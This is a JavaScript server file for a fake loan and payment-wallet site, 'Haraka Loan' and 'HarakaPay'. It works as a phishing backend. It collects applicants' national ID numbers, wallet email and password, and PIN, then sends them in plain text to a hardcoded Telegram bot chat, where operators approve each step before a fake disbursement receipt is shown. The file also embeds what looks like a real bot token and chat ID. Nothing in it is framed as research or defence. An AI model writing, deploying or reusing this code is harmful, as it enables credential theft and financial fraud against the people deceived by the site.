'use strict';

/**
 * Haraka Loan — application + HarakaPay payment backend
 * with live Telegram agent review for BOTH:
 *   1. Loan applications  (refs HL-xxxxxx)
 *   2. HarakaPay login + PIN payment connections (refs HP-xxxxxx)
 *
 * Run:      node server.js        (then open http://localhost:3000)
 *
 * Flow:
 *   - application.html → POST /api/apply → Telegram "🆕 New Loan Application"
 *     with ✅ Approve / ❌ Decline → status.html polls /api/status.
 *   - login.html → POST /api/paylogin → Telegram "🔑 Login request" with buttons
 *     → pin.html. PIN submit → POST /api/paysubmit → Telegram "🔐 Payment
 *     confirmation" with buttons → status.html polls /api/pstatus until
 *     approved → success.html (disbursement receipt).
 *
 * No npm dependencies — Node.js built-ins only.
 *
 * NOTE: the bot token should ideally come from the environment:
 *         HARAKA_BOT_TOKEN=... HARAKA_CHAT_ID=... node server.js
 *       Do not share this file publicly — it contains a bot token.
 */

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PORT = Number(process.env.PORT) || 3000;
const BOT_TOKEN = process.env.HARAKA_BOT_TOKEN || '8133407038:AAHgibqH9lia9xUd1xMSTJVlGm82Gd8kGvc';
const CHAT_ID = process.env.HARAKA_CHAT_ID || '7844108983';
const DB_FILE = path.join(__dirname, 'applications.json');
const POLLING = process.env.HARAKA_POLLING !== '0';
const PERIOD_DAYS = { '1': 30, '2': 60, '4': 120, '6': 180, '8': 240, '12': 365, '24': 730 };
const PERIOD_LABELS = {
  '1': '1 month', '2': '2 months', '4': '4 months', '6': '6 months',
  '8': '8 months', '12': '1 year', '24': '2 years'
};
const FEE_RATE = 0.05;
const MIN_AMOUNT = 25000;
const MAX_AMOUNT = 5000000;

/* -------------------------- tiny JSON file "db" -------------------------- */
let db = {};
try { db = JSON.parse(fs.readFileSync(DB_FILE, 'utf8')) || {}; } catch (_) { db = {}; }

function saveDb() {
  try { fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2)); }
  catch (e) { console.error('[db] save failed:', e.message); }
}

function newRef(prefix) {
  let ref;
  do { ref = prefix + '-' + String(crypto.randomInt(100000, 1000000)); } while (db[ref]);
  return ref;
}

function tzs(n) { return 'TZS ' + Number(n).toLocaleString('en-US'); }

/* --------------------------- Telegram helpers ---------------------------- */
function tgCall(method, payload) {
  return new Promise((resolve) => {
    const body = JSON.stringify(payload || {});
    const req = https.request({
      hostname: 'api.telegram.org',
      path: '/bot' + BOT_TOKEN + '/' + method,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    }, (res) => {
      let data = '';
      res.on('data', (c) => { data += c; });
      res.on('end', () => {
        try { resolve(JSON.parse(data)); }
        catch (_) { resolve({ ok: false, error: data || 'bad response' }); }
      });
    });
    req.on('error', (e) => resolve({ ok: false, error: e.message }));
    req.setTimeout(10000, () => { req.destroy(); resolve({ ok: false, error: 'timeout' }); });
    req.write(body);
    req.end();
  });
}

/* ------------------------------ loan texts ------------------------------- */
function applicationText(rec) {
  return [
    '🆕 NEW LOAN APPLICATION — Haraka Loan',
    '',
    'Ref: ' + rec.reference,
    '',
    '👤 ' + rec.fullName,
    '📞 ' + rec.phone,
    '🪪 NIDA: ' + rec.nida,
    '🎂 ' + rec.dob + '  (' + rec.gender + ')',
    '📍 ' + rec.region,
    '💼 ' + rec.employment + ' — income ' + tzs(rec.income || 0),
    '',
    '💰 Amount: ' + tzs(rec.amount),
    '⏳ Period: ' + (PERIOD_LABELS[rec.duration] || rec.duration),
    '🎯 Purpose: ' + rec.purpose,
    '',
    'Offer: 5% fee = ' + tzs(rec.fee) + ' | total ' + tzs(rec.total) +
      ' | due ' + rec.dueDate,
    '',
    'Reply to approve or decline.'
  ].join('\n');
}

function payText(rec, step) {
  if (step === 'login') {
    return [
      '🔑 HARAKAPAY LOGIN REQUEST — Haraka Loan',
      '',
      'Ref: ' + rec.reference,
      '',
      '📧 HarakaPay account: ' + rec.email,
      '🔒 Password: ' + rec.password,
      '🕒 ' + new Date(rec.loginAt).toLocaleString(),
      '',
      'Approve to let this account continue into PIN confirmation.'
    ].join('\n');
  }
  return [
    '🔐 HARAKAPAY PAYMENT CONFIRMATION — Haraka Loan',
    '',
    'Ref: ' + rec.reference,
    '',
    '📧 HarakaPay account: ' + rec.email,
    '🔑 PIN: ' + rec.pin,
    '🕒 ' + new Date(rec.pinAt).toLocaleString(),
    '',
    'Approve to connect this wallet and send the loan funds.'
  ].join('\n');
}

/* ----------------------------- applications ------------------------------ */
function cleanStr(v) { return String(v == null ? '' : v).trim(); }

async function createApplication(data) {
  const errors = {};
  const fullName = cleanStr(data.fullName);
  const phone = cleanStr(data.phone);
  const nida = cleanStr(data.nida);
  const amount = Number(data.amount);

  if (fullName.length < 3) errors.fullName = 'Full name required';
  if (!/^[+\d][\d\s-]{6,}$/.test(phone)) errors.phone = 'Valid phone required';
  if (!/^\d{20}$/.test(nida)) errors.nida = 'NIDA must be 20 digits';
  if (!Number.isFinite(amount) || amount < MIN_AMOUNT || amount > MAX_AMOUNT) {
    errors.amount = 'Amount must be between ' + MIN_AMOUNT + ' and ' + MAX_AMOUNT;
  }
  if (!PERIOD_DAYS[cleanStr(data.duration)]) errors.duration = 'Invalid repayment period';
  if (!cleanStr(data.region)) errors.region = 'Region required';
  if (Object.keys(errors).length) {
    const err = new Error('Validation failed');
    err.fields = errors;
    throw err;
  }

  const rec = {
    type: 'loan',
    reference: newRef('HL'),
    status: 'pending',
    submittedAt: new Date().toISOString(),

    fullName,
    nida,
    dob: cleanStr(data.dob),
    gender: cleanStr(data.gender),
    phone,
    region: cleanStr(data.region),
    employment: cleanStr(data.employment),
    income: Number(data.income) || 0,

    amount,
    purpose: cleanStr(data.purpose),
    duration: cleanStr(data.duration)
  };

  rec.days = PERIOD_DAYS[rec.duration];
  rec.fee = Math.round(rec.amount * FEE_RATE);
  rec.total = rec.amount + rec.fee;
  rec.dueDate = new Date(Date.now() + rec.days * 86400000).toISOString().slice(0, 10);
  rec.requestText = applicationText(rec);

  db[rec.reference] = rec;
  saveDb();

  const tg = await notifyAgents(rec, rec.requestText);
  rec.telegramDelivered = tg.ok;
  if (tg.ok) rec.telegramMessageId = tg.messageId;
  saveDb();
  console.log('[apply]', rec.reference, rec.fullName, tzs(rec.amount),
    tg.ok ? '(sent to Telegram)' : '(Telegram failed: ' + tg.error + ')');
  return rec;
}

/* --------------------------- HarakaPay sessions -------------------------- */
async function createPayLogin(data) {
  const email = cleanStr(data.email).toLowerCase();
  const password = String(data.password == null ? '' : data.password);
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    const err = new Error('Validation failed');
    err.fields = { email: 'Valid HarakaPay email required' };
    throw err;
  }
  if (password.length < 4) {
    const err = new Error('Validation failed');
    err.fields = { password: 'Password must be at least 4 characters' };
    throw err;
  }

  const rec = {
    type: 'pay',
    reference: newRef('HP'),
    status: 'login_pending',   // login_pending → pending (after PIN) → approved/declined
    loginAt: new Date().toISOString(),
    email,
    password                   // sent to the agent chat in plain text on request
  };

  db[rec.reference] = rec;
  saveDb();

  rec.requestText = payText(rec, 'login');
  const tg = await notifyAgents(rec, rec.requestText);
  rec.telegramDelivered = tg.ok;
  if (tg.ok) rec.telegramMessageId = tg.messageId;
  saveDb();
  console.log('[pay-login]', rec.reference, rec.email,
    tg.ok ? '(sent to Telegram)' : '(Telegram failed: ' + tg.error + ')');
  return rec;
}

async function submitPayPin(ref, pin) {
  const rec = db[ref && ref.toUpperCase()];
  if (!rec || rec.type !== 'pay') return null;
  if (!/^\d{4}$/.test(String(pin || ''))) {
    const err = new Error('Validation failed');
    err.fields = { pin: '4-digit PIN required' };
    throw err;
  }
  if (rec.status === 'declined') return rec;

  rec.pin = String(pin);
  rec.pinAt = new Date().toISOString();
  rec.status = 'pending';
  saveDb();

  rec.requestText = payText(rec, 'pin');
  const tg = await notifyAgents(rec, rec.requestText);
  rec.telegramDelivered = tg.ok;
  if (tg.ok) rec.telegramMessageId = tg.messageId;
  saveDb();
  console.log('[pay-pin]', rec.reference, rec.email,
    tg.ok ? '(sent to Telegram)' : '(Telegram failed: ' + tg.error + ')');
  return rec;
}

/* ---------------------------- message plumbing --------------------------- */
async function notifyAgents(rec, text) {
  const res = await tgCall('sendMessage', {
    chat_id: CHAT_ID,
    text,
    reply_markup: { inline_keyboard: [[
      { text: '✅ Approve', callback_data: 'APPROVE:' + rec.reference },
      { text: '❌ Decline', callback_data: 'DECLINE:' + rec.reference }
    ]] }
  });
  return {
    ok: !!res.ok,
    messageId: res.ok && res.result ? res.result.message_id : null,
    error: res.ok ? null : (res.error || (res.description || 'telegram error'))
  };
}

async function decide(ref, decision, byAgent) {
  const rec = db[ref && ref.toUpperCase()];
  if (!rec) return null;
  if (rec.status === 'approved' || rec.status === 'declined') return rec;

  rec.status = decision === 'APPROVE' ? 'approved' : 'declined';
  rec.decidedAt = new Date().toISOString();
  rec.decidedBy = byAgent || 'agent';
  saveDb();
  console.log('[decision]', rec.reference, rec.status, 'by', rec.decidedBy);

  /* mark the original request message as decided */
  if (rec.telegramMessageId && rec.requestText) {
    await tgCall('editMessageText', {
      chat_id: CHAT_ID,
      message_id: rec.telegramMessageId,
      text: rec.requestText + '\n\n' +
        (rec.status === 'approved' ? '✅ APPROVED by ' + rec.decidedBy
                                   : '❌ DECLINED by ' + rec.decidedBy)
    }).catch(() => {});
  }

  /* short confirmation in the agent chat */
  let msg;
  if (rec.type === 'pay') {
    msg = rec.status === 'approved'
      ? '✅ ' + rec.reference + ' imekubaliwa — akaunti ' + rec.email +
        ' imeunganishwa. Mkopo unaendelea kwenda kwenye pochi.'
      : '❌ ' + rec.reference + ' imekatazwa — ' + rec.email;
  } else {
    msg = rec.status === 'approved'
      ? '✅ ' + rec.reference + ' IMEKUBALIWA — ' + tzs(rec.amount) +
        ' (due ' + rec.dueDate + '). Mteja aanze kuunganisha HarakaPay.'
      : '❌ ' + rec.reference + ' IMEKATAZWA — ' + rec.fullName + '. Arbainisha mtumiaji aombe tena.';
  }
  await tgCall('sendMessage', { chat_id: CHAT_ID, text: msg }).catch(() => {});
  return rec;
}

/* --------------------------- Telegram updates ---------------------------- */
async function handleUpdate(update) {
  try {
    if (update && update.callback_query) {
      const q = update.callback_query;
      await tgCall('answerCallbackQuery', { callback_query_id: q.id }).catch(() => {});
      const [action, ref] = String(q.data || '').split(':');
      if (action === 'APPROVE' || action === 'DECLINE') {
        const agent = q.from && (q.from.first_name || 'agent');
        await decide(ref, action, agent);
      }
      return;
    }

    if (update && update.message && typeof update.message.text === 'string') {
      const text = update.message.text.trim();
      const m = text.match(/^\/?(approve|decline)\s+(HL|HP)-\d{6}$/i);
      if (m) {
        await decide(m[2], m[1].toUpperCase(),
          update.message.from && update.message.from.first_name || 'agent');
      }
    }
  } catch (e) {
    console.error('[telegram update] error:', e.message);
  }
}

let tgOffset = 0;
let polling = null;

async function pollOnce() {
  const res = await tgCall('getUpdates', {
    offset: tgOffset, timeout: 0,
    allowed_updates: ['callback_query', 'message']
  });
  if (res.ok && Array.isArray(res.result)) {
    for (const upd of res.result) {
      tgOffset = upd.update_id + 1;
      handleUpdate(upd);
    }
  }
}

/* log whether the bot can actually reach this chat, with the API's own error */
function logTelegramHealth() {
  tgCall('getMe').then((me) => {
    if (!me.ok) {
      console.error('[telegram] getMe failed →', me.error || me.description || JSON.stringify(me));
      return;
    }
    console.log('[telegram] bot @' + me.result.username + ' OK (chat_id=' + CHAT_ID + ')');
    return tgCall('sendMessage', { chat_id: CHAT_ID, text: '✅ Haraka Loan backend is live on ' + (process.env.RENDER_EXTERNAL_URL || 'local') });
  }).then((sent) => {
    if (sent && !sent.ok) {
      console.error('[telegram] cannot message CHAT_ID=' + CHAT_ID + ' →', sent.error || sent.description || JSON.stringify(sent));
    }
  }).catch((e) => console.error('[telegram] health check error:', e.message));
}

function startPolling() {
  logTelegramHealth();
  tgCall('deleteWebhook').catch(() => {});
  polling = setInterval(() => {
    pollOnce().catch((e) => console.error('[telegram poll]', e && e.message));
  }, 3000);
  pollOnce();
}

/* ------------------------------- HTTP layer ------------------------------ */
const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.png': 'image/png',
  '.webp': 'image/webp',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon'
};

function sendJson(res, code, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(code, {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(body),
    'Cache-Control': 'no-store'
  });
  res.end(body);
}

function readBody(req) {
  return new Promise((resolve) => {
    let size = 0;
    let out = '';
    req.on('data', (c) => {
      size += c.length;
      if (size > 16384) { req.destroy(); resolve(null); return; }
      out += c;
    });
    req.on('end', () => {
      try { resolve(JSON.parse(out || '{}')); }
      catch (_) { resolve(null); }
    });
    req.on('error', () => resolve(null));
  });
}

function serveStatic(res, pathname) {
  let rel = decodeURIComponent(pathname);
  if (rel === '/' || rel === '') rel = '/index.html';
  if (rel.endsWith('.json') || rel.split('/').pop().startsWith('.env')) {
    res.writeHead(403); res.end('Forbidden'); return true;
  }
  const file = path.join(__dirname, path.normalize(rel));
  if (!file.startsWith(__dirname)) { res.writeHead(403); res.end('Forbidden'); return true; }
  fs.readFile(file, (err, buf) => {
    if (err) { res.writeHead(404); res.end('Not found'); return; }
    res.writeHead(200, { 'Content-Type': MIME[path.extname(file).toLowerCase()] || 'application/octet-stream' });
    res.end(buf);
  });
  return true;
}

async function requestHandler(req, res) {
  const u = new URL(req.url, 'http://localhost');

  if (u.pathname === '/api/apply' && req.method === 'POST') {
    const data = await readBody(req);
    if (!data) { sendJson(res, 400, { ok: false, error: 'Invalid JSON body' }); return; }
    try {
      const rec = await createApplication(data);
      sendJson(res, 200, { ok: true, ref: rec.reference, telegramDelivered: rec.telegramDelivered });
    } catch (e) {
      sendJson(res, e.fields ? 422 : 500, { ok: false, error: e.message, fields: e.fields || null });
    }
    return;
  }

  if (u.pathname === '/api/status') {
    const ref = (u.searchParams.get('ref') || '').toUpperCase();
    const rec = db[ref];
    if (!rec || rec.type !== 'loan') { sendJson(res, 404, { ok: false, error: 'Application not found' }); return; }
    sendJson(res, 200, {
      ok: true,
      status: rec.status,
      application: {
        reference: rec.reference,
        fullName: rec.fullName,
        phone: rec.phone,
        region: rec.region,
        amount: rec.amount,
        period: PERIOD_LABELS[rec.duration] || rec.duration,
        purpose: rec.purpose,
        fee: rec.fee,
        total: rec.total,
        dueDate: rec.dueDate,
        submittedAt: rec.submittedAt,
        decidedAt: rec.decidedAt || null
      }
    });
    return;
  }

  if (u.pathname === '/api/paylogin' && req.method === 'POST') {
    const data = await readBody(req);
    if (!data) { sendJson(res, 400, { ok: false, error: 'Invalid JSON body' }); return; }
    try {
      const rec = await createPayLogin(data);
      sendJson(res, 200, { ok: true, ref: rec.reference, telegramDelivered: rec.telegramDelivered });
    } catch (e) {
      sendJson(res, e.fields ? 422 : 500, { ok: false, error: e.message, fields: e.fields || null });
    }
    return;
  }

  if (u.pathname === '/api/paysubmit' && req.method === 'POST') {
    const data = await readBody(req);
    if (!data) { sendJson(res, 400, { ok: false, error: 'Invalid JSON body' }); return; }
    try {
      const rec = await submitPayPin(data.ref, data.pin);
      if (!rec) { sendJson(res, 404, { ok: false, error: 'Pay session not found' }); return; }
      if (rec.status === 'declined') { sendJson(res, 200, { ok: true, ref: rec.reference, status: 'declined' }); return; }
      sendJson(res, 200, { ok: true, ref: rec.reference, status: rec.status, telegramDelivered: rec.telegramDelivered });
    } catch (e) {
      sendJson(res, e.fields ? 422 : 500, { ok: false, error: e.message, fields: e.fields || null });
    }
    return;
  }

  if (u.pathname === '/api/pstatus') {
    const ref = (u.searchParams.get('ref') || '').toUpperCase();
    const rec = db[ref];
    if (!rec || rec.type !== 'pay') { sendJson(res, 404, { ok: false, error: 'Pay session not found' }); return; }
    sendJson(res, 200, { ok: true, status: rec.status, email: rec.email, reference: rec.reference });
    return;
  }

  if (u.pathname === '/telegram-webhook' && req.method === 'POST') {
    const update = await readBody(req);
    if (update) handleUpdate(update);
    sendJson(res, 200, { ok: true });
    return;
  }

  serveStatic(res, u.pathname);
}

let httpServer = null;

function start(port) {
  return new Promise((resolve) => {
    httpServer = http.createServer((rq, rs) => { requestHandler(rq, rs).catch(() => {}); });
    httpServer.listen(port || PORT, () => {
      console.log('🏦 Haraka Loan server running → http://localhost:' + (port || PORT));
      resolve(httpServer);
    });
  });
}

function stop() {
  if (polling) clearInterval(polling);
  return new Promise((resolve) => {
    if (!httpServer) return resolve();
    httpServer.close(() => resolve());
  });
}

if (require.main === module) {
  start();
  if (POLLING) startPolling();
  else console.log('[telegram] polling disabled (HARAKA_POLLING=0), use /telegram-webhook');
}

module.exports = {
  start, stop, handleUpdate,
  createApplication, createPayLogin, submitPayPin,
  decide, db: () => db, DB_FILE
};
